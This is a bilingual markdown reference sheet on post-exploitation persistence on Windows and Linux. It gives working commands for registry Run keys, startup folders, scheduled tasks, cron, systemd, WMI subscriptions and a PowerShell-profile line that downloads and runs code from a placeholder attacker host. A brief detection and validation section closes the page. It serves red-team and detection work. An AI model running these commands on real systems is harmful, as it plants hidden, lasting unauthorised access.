---
title: Persistence Mechanisms
phase: post-explotacion
platform: [windows, linux]
tags: [persistence, registry, cron, startup]
risk: high
attack_tactic: TA0003
attack_technique: T1547
data_sources: [registry-logs, startup-logs, scheduled-task-logs, sysmon]
last_review: 2026-05-25
---

# Persistence Mechanisms

### Objetivo

Establecer acceso persistente a un sistema comprometido para mantener presencia even after reboots o credential rotation.

### Windows Registry

```cmd
# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Malware" /t REG_SZ /d "C:\temp\malware.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Malware" /t REG_SZ /d "C:\temp\malware.exe"

# RunOnce
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Cleanup" /d "C:\temp\cleanup.bat"
```

### Windows Startup Folder

```cmd
# Startup folder persistence
copy malware.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Scheduled Tasks

```cmd
# schtasks daily at 9am
schtasks /create /tn "SecurityUpdate" /tr "C:\temp\malware.exe" /sc daily /st 09:00

# At startup
schtasks /create /tn "BootCheck" /tr "C:\temp\malware.exe" /sc onlogon

# Run with highest privileges
schtasks /create /tn "SysUpdate" /tr "C:\Windows\Temp\update.exe" /sc daily /ru SYSTEM
```

### Linux Cron

```bash
# Cron persistence
echo "* * * * * /tmp/malware" >> /etc/crontab

# crontab user
crontab -e
*/5 * * * * /tmp/beacon.sh

# systemd service
cat > /etc/systemd/system/malware.service <<EOF
[Unit]
Description=System Service
[Service]
Type=simple
ExecStart=/tmp/malware
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable malware
```

### WMI Event Subscription (Stealthy, Windows)

```powershell
# Create permanent WMI event consumer
$Filter = Set-WMIInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "MaliciousFilter"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
}
$Consumer = Set-WMIInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "MaliciousConsumer"
    CommandLineTemplate = "C:\temp\malware.exe"
}
Set-WMIInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

### One-liners

```powershell
# PowerShell profile persistence
echo "IEX (New-Object Net.WebClient).DownloadString('http://attacker/evil.ps1')" >> $PROFILE

# Linux /etc/rc.local
echo "/tmp/beacon &" >> /etc/rc.local
```

### Detección y Mitigación

- **Visibilidad:** Sysmon EID 12/13/14 (registry events), EID 1 (new scheduled tasks), monitor autoruns changes.
- **Hardening:** Requir admin para registry changes, audit scheduled task creation, deploy Application Whitelisting.

### Validación de Cobertura

- **Prueba técnica:** atomic-red-team T1053 (scheduled task), T1547 (registry run keys).
- **Criterio de éxito:** Alert on new scheduled task creation or registry Run key Modification.
